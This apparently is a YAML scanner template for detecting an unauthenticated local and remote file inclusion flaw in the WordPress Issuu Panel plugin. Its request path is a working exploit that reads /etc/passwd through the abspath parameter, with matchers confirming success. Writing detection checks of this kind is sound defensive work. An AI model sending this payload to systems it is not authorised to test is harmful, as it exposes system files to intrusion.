id: issuu-panel-lfi
name: Wordpress Plugin Issuu Panel Remote/Local File Inclusion
severity: high
confidence: tentative
description: The WordPress Issuu Plugin includes an arbitrary file disclosure vulnerability that allows unauthenticated attackers
  to disclose the content of local and remote files.
reference: CWE-22
tags:
- wp-plugin
- wordpress
- lfi
- rfi
- vuln
requests:
- method: GET
  path: /wp-content/plugins/issuu-panel/menu/documento/requests/ajax-docs.php?abspath=%2Fetc%2Fpasswd
  matchers:
  - type: regex
    regex:
    - root:[x*]:0:0
  - type: status
    status:
    - 200
  condition: and
